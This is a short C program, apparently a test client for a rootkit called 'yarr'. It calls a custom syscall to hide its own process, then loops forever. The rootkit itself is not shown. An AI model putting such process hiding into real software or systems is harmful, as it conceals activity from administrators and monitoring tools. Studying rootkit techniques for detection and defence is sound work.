#include <unistd.h>
#include <stdio.h>
#include <sys/syscall.h>
#include <sys/types.h>

#include "types.h"

/***
 * This program just tries to hides itself using yarr, then it goes into an
 * infinite loop until a signal (or anything) cause it to end.
 */
int main(int argc, char *argv[]) {
	syscallData data;

	data.pid = getpid();
	printf("Process %d will hide.\n", data.pid);
	syscall(YARR_SYSCALL, HIDE_PROCESS, &data);
	while(0x01ec0ded);
	return 0;
}
